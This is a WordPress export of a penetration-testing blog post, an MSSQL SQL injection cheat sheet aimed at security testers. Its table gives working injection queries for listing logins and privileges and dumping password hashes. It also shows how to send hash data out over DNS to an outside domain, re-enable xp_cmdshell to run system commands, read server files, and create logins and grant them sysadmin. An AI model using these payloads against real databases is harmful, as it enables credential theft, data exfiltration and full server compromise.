{"id":88,"date":"2007-11-27T20:23:00","date_gmt":"2007-11-27T20:23:00","guid":{"rendered":"http:\/\/pentestmonkey.net\/?p=88"},"modified":"2012-03-10T19:00:28","modified_gmt":"2012-03-10T19:00:28","slug":"mssql-sql-injection-cheat-sheet","status":"publish","type":"post","link":"https:\/\/pentestmonkey.net\/cheat-sheet\/sql-injection\/mssql-sql-injection-cheat-sheet","title":{"rendered":"MSSQL Injection Cheat Sheet"},"content":{"rendered":"<p>Some useful syntax reminders for SQL Injection into MSSQL databases&#8230;<br \/>\n<!--more--><\/p>\n<p>This post is part of a series of SQL Injection Cheat Sheets.\u00a0 In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.\u00a0 This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.<\/p>\n<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:<\/p>\n<ul>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/oracle-sql-injection-cheat-sheet\/\">Oracle<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/mssql-sql-injection-cheat-sheet\/\">MSSQL<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/mysql-sql-injection-cheat-sheet\/\">MySQL<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/postgres-sql-injection-cheat-sheet\/\">PostgreSQL<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/ingres-sql-injection-cheat-sheet\/\">Ingres<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/db2-sql-injection-cheat-sheet\/\">DB2<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/informix-sql-injection-cheat-sheet\/\">Informix<\/a><\/li>\n<\/ul>\n<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href=\"http:\/\/nibblesec.org\/files\/MSAccessSQLi\/MSAccessSQLi.html\">MS Access Cheat Sheet here<\/a>.<\/p>\n<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.<\/p>\n<table border=\"1\">\n<tbody>\n<tr>\n<td>Version<\/td>\n<td>SELECT @@version<\/td>\n<\/tr>\n<tr>\n<td>Comments<\/td>\n<td>SELECT 1 &#8212; comment<br \/>\nSELECT \/*comment*\/1<\/td>\n<\/tr>\n<tr>\n<td>Current User<\/td>\n<td>SELECT user_name();<br \/>\nSELECT system_user;<br \/>\nSELECT user;<br \/>\nSELECT loginame FROM master..sysprocesses WHERE spid = @@SPID<\/td>\n<\/tr>\n<tr>\n<td>List Users<\/td>\n<td>SELECT name FROM master..syslogins<\/td>\n<\/tr>\n<tr>\n<td>List Password Hashes<\/td>\n<td>SELECT name, password FROM master..sysxlogins &#8212; priv, mssql 2000;<br \/>\nSELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins &#8212; priv, mssql 2000.\u00a0 Need to convert to hex to return hashes in MSSQL error message \/ some version of query analyzer.<br \/>\nSELECT name, password_hash FROM master.sys.sql_logins &#8212; priv, mssql 2005;<br \/>\nSELECT name + &#8216;-&#8216; + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins &#8212; priv, mssql 2005<\/td>\n<\/tr>\n<tr>\n<td>\u00a0Password Cracker<\/td>\n<td>MSSQL 2000 and 2005 Hashes are both SHA1-based.\u00a0 <a href=\"https:\/\/labs.portcullis.co.uk\/application\/phrasen-drescher\/\">phrasen|drescher<\/a> can crack these.<\/td>\n<\/tr>\n<tr>\n<td>List Privileges<\/td>\n<td>&#8212; current privs on a particular object in 2005, 2008<br \/>\nSELECT permission_name FROM master..fn_my_permissions(null, &#8216;DATABASE&#8217;); &#8212; current database<br \/>\nSELECT permission_name FROM master..fn_my_permissions(null, &#8216;SERVER&#8217;); &#8212; current server<br \/>\nSELECT permission_name FROM master..fn_my_permissions(&#8216;master..syslogins&#8217;, &#8216;OBJECT&#8217;); &#8211;permissions on a table<br \/>\nSELECT permission_name FROM master..fn_my_permissions(&#8216;sa&#8217;, &#8216;USER&#8217;);<\/p>\n<p>&#8211;permissions on a user&#8211; current privs in 2005, 2008<br \/>\nSELECT is_srvrolemember(&#8216;sysadmin&#8217;);<br \/>\nSELECT is_srvrolemember(&#8216;dbcreator&#8217;);<br \/>\nSELECT is_srvrolemember(&#8216;bulkadmin&#8217;);<br \/>\nSELECT is_srvrolemember(&#8216;diskadmin&#8217;);<br \/>\nSELECT is_srvrolemember(&#8216;processadmin&#8217;);<br \/>\nSELECT is_srvrolemember(&#8216;serveradmin&#8217;);<br \/>\nSELECT is_srvrolemember(&#8216;setupadmin&#8217;);<br \/>\nSELECT is_srvrolemember(&#8216;securityadmin&#8217;);<\/p>\n<p>&#8212; who has a particular priv? 2005, 2008<br \/>\nSELECT name FROM master..syslogins WHERE denylogin = 0;<br \/>\nSELECT name FROM master..syslogins WHERE hasaccess = 1;<br \/>\nSELECT name FROM master..syslogins WHERE isntname = 0;<br \/>\nSELECT name FROM master..syslogins WHERE isntgroup = 0;<br \/>\nSELECT name FROM master..syslogins WHERE sysadmin = 1;<br \/>\nSELECT name FROM master..syslogins WHERE securityadmin = 1;<br \/>\nSELECT name FROM master..syslogins WHERE serveradmin = 1;<br \/>\nSELECT name FROM master..syslogins WHERE setupadmin = 1;<br \/>\nSELECT name FROM master..syslogins WHERE processadmin = 1;<br \/>\nSELECT name FROM master..syslogins WHERE diskadmin = 1;<br \/>\nSELECT name FROM master..syslogins WHERE dbcreator = 1;<br \/>\nSELECT name FROM master..syslogins WHERE bulkadmin = 1;<\/td>\n<\/tr>\n<tr>\n<td>List DBA Accounts<\/td>\n<td>SELECT is_srvrolemember(&#8216;sysadmin&#8217;); &#8212; is your account a sysadmin?\u00a0 returns 1 for true, 0 for false, NULL for invalid role.\u00a0 Also try &#8216;bulkadmin&#8217;, &#8216;systemadmin&#8217; and other values from the <a href=\"http:\/\/msdn.microsoft.com\/en-us\/library\/ms176015.aspx\">documentation<br \/>\n<\/a> SELECT is_srvrolemember(&#8216;sysadmin&#8217;, &#8216;sa&#8217;); &#8212; is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role\/username.<br \/>\nSELECT name FROM\u00a0master..syslogins WHERE sysadmin = &#8216;1&#8217; &#8212; tested on 2005<\/td>\n<\/tr>\n<tr>\n<td>Current Database<\/td>\n<td>SELECT DB_NAME()<\/td>\n<\/tr>\n<tr>\n<td>List Databases<\/td>\n<td>SELECT name FROM master..sysdatabases;<br \/>\nSELECT DB_NAME(N); &#8212; for N = 0, 1, 2, &#8230;<\/td>\n<\/tr>\n<tr>\n<td>List Columns<\/td>\n<td>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = &#8216;mytable&#8217;); &#8212; for the current DB only<br \/>\nSELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#8217;sometable&#8217;; &#8212; list colum names and types for master..sometable<\/td>\n<\/tr>\n<tr>\n<td>List Tables<\/td>\n<td>SELECT name FROM master..sysobjects WHERE xtype = &#8216;U&#8217;; &#8212; use xtype = &#8216;V&#8217; for views<br \/>\nSELECT name FROM someotherdb..sysobjects WHERE xtype = &#8216;U&#8217;;<br \/>\nSELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#8217;sometable&#8217;; &#8212; list colum names and types for master..sometable<\/td>\n<\/tr>\n<tr>\n<td>Find Tables From Column Name<\/td>\n<td>&#8212; NB: This example works only for the current database.\u00a0 If you wan&#8217;t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).<br \/>\nSELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = &#8216;U&#8217; AND syscolumns.name LIKE &#8216;%PASSWORD%&#8217; &#8212; this lists table, column for each column containing the word &#8216;password&#8217;<\/td>\n<\/tr>\n<tr>\n<td>Select Nth Row<\/td>\n<td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC &#8212; gets 9th row<\/td>\n<\/tr>\n<tr>\n<td>Select Nth Char<\/td>\n<td>SELECT substring(&#8216;abcd&#8217;, 3, 1) &#8212; returns c<\/td>\n<\/tr>\n<tr>\n<td>Bitwise AND<\/td>\n<td>SELECT 6 &amp; 2 &#8212; returns 2<br \/>\nSELECT 6 &amp; 1 &#8212; returns 0<\/td>\n<\/tr>\n<tr>\n<td>ASCII Value -&gt; Char<\/td>\n<td>SELECT char(0x41) &#8212; returns A<\/td>\n<\/tr>\n<tr>\n<td>Char -&gt; ASCII Value<\/td>\n<td>SELECT ascii(&#8216;A&#8217;) &#8211; returns 65<\/td>\n<\/tr>\n<tr>\n<td>Casting<\/td>\n<td>SELECT CAST(&#8216;1&#8217; as int);<br \/>\nSELECT CAST(1 as char)<\/td>\n<\/tr>\n<tr>\n<td>String Concatenation<\/td>\n<td>SELECT &#8216;A&#8217; + &#8216;B&#8217; &#8211; returns AB<\/td>\n<\/tr>\n<tr>\n<td>If Statement<\/td>\n<td><span>IF (1=1) SELECT 1 ELSE SELECT 2 &#8212; returns 1<\/span><\/td>\n<\/tr>\n<tr>\n<td>Case Statement<\/td>\n<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END &#8212; returns 1<\/td>\n<\/tr>\n<tr>\n<td>Avoiding Quotes<\/td>\n<td>SELECT char(65)+char(66) &#8212; returns AB<\/td>\n<\/tr>\n<tr>\n<td>Time Delay<\/td>\n<td>\u00a0WAITFOR DELAY &#8216;0:0:5&#8217; &#8212; pause for 5 seconds<\/td>\n<\/tr>\n<tr>\n<td>Make DNS Requests<\/td>\n<td>declare @host varchar(800); select @host = name FROM master..syslogins; exec(&#8216;master..xp_getfiledetails &#8221;\\&#8217; + @host + &#8216;c$boot.ini&#8221;&#8217;); &#8212; nonpriv, works on 2000declare @host varchar(800); select @host = name + &#8216;-&#8216; + master.sys.fn_varbintohexstr(password_hash) + &#8216;.2.pentestmonkey.net&#8217; from sys.sql_logins; exec(&#8216;xp_fileexist &#8221;\\&#8217; + @host + &#8216;c$boot.ini&#8221;&#8217;); &#8212; priv, works on 2005&#8211; NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.\u00a0 Messy but necessary.<br \/>\n&#8212; Also check out theDNS tunnel feature of <a href=\"http:\/\/sqlninja.sourceforge.net\/sqlninja-howto.html\">sqlninja<\/a><\/td>\n<\/tr>\n<tr>\n<td>Command Execution<\/td>\n<td>EXEC xp_cmdshell &#8216;net user&#8217;; &#8212; privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it&#8217;s disabled by default:<br \/>\nEXEC sp_configure &#8216;show advanced options&#8217;, 1; &#8212; priv<br \/>\nRECONFIGURE; &#8212; priv<br \/>\nEXEC sp_configure &#8216;xp_cmdshell&#8217;, 1; &#8212; priv<br \/>\nRECONFIGURE; &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>Local File Access<\/td>\n<td>CREATE TABLE mydata (line varchar(8000));<br \/>\nBULK INSERT mydata FROM &#8216;c:boot.ini&#8217;;<br \/>\nDROP TABLE mydata;<\/td>\n<\/tr>\n<tr>\n<td>Hostname, IP Address<\/td>\n<td>SELECT HOST_NAME()<\/td>\n<\/tr>\n<tr>\n<td>Create Users<\/td>\n<td>EXEC <a href=\"http:\/\/msdn2.microsoft.com\/en-us\/library\/ms173768.aspx\">sp_addlogin<\/a> &#8216;user&#8217;, &#8216;pass&#8217;; &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>Drop Users<\/td>\n<td>EXEC <a href=\"http:\/\/msdn2.microsoft.com\/en-us\/library\/ms189767.aspx\">sp_droplogin<\/a> &#8216;user&#8217;; &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>Make User DBA<\/td>\n<td>EXEC <a href=\"http:\/\/msdn2.microsoft.com\/en-us\/library\/ms186320.aspx\">master.dbo.sp_addsrvrolemember<\/a> &#8216;user&#8217;, &#8216;sysadmin; &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>Location of DB files<\/td>\n<td>EXEC sp_helpdb master; &#8211;location of master.mdf<br \/>\nEXEC sp_helpdb pubs; &#8211;location of pubs.mdf<\/td>\n<\/tr>\n<tr>\n<td>Default\/System Databases<\/td>\n<td>northwind<br \/>\nmodel<br \/>\nmsdb<br \/>\npubs &#8212; not on sql server 2005<br \/>\ntempdb<\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n<h3>Misc Tips<\/h3>\n<p>In no particular order, here are some suggestions from pentestmonkey readers.<\/p>\n<p><strong>From Dan Crowley:<\/strong><br \/>\n<a href=\"http:\/\/www.notsosecure.com\/folder2\/2010\/06\/29\/mysql-exploitation-with-error-messages\">A way to extract data via SQLi with a MySQL backend<\/a><\/p>\n<p><strong>From Jeremy Bae:<\/strong><br \/>\nTip about sp_helpdb &#8211; included in table above.<\/p>\n<p><strong>From Trip:<\/strong><br \/>\nList DBAs (included in table above now):<\/p>\n<blockquote><p>select name from master..syslogins where sysadmin = &#8216;1&#8217;<\/p><\/blockquote>\n<p><strong>From Daniele Costa:<\/strong><br \/>\nTips on using fn_my_permissions in 2005, 2008 &#8211; included in table above.<br \/>\nAlso:<br \/>\nTo check permissions on multiple database you will have to use the following pattern.<\/p>\n<blockquote><p>USE [DBNAME]; select permission_name   FROM fn_my_permissions (NULL, &#8216;DATABASE&#8217;)<\/p><\/blockquote>\n<p>Note also that in case of using this data with a UNION query a collation error could occur.<br \/>\nIn this case a simple trick is to use the following syntax:<\/p>\n<blockquote><p> select permission_name collate database_default  FROM fn_my_permissions (NULL, &#8216;DATABASE&#8217;)\n<\/p><\/blockquote>\n","protected":false},"excerpt":{"rendered":"<p>Some useful syntax reminders for SQL Injection into MSSQL databases&#8230;<\/p>\n","protected":false},"author":3,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[8],"tags":[46,91,78],"_links":{"self":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/88"}],"collection":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/users\/3"}],"replies":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/comments?post=88"}],"version-history":[{"count":11,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/88\/revisions"}],"predecessor-version":[{"id":397,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/88\/revisions\/397"}],"wp:attachment":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/media?parent=88"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/categories?post=88"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/tags?post=88"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}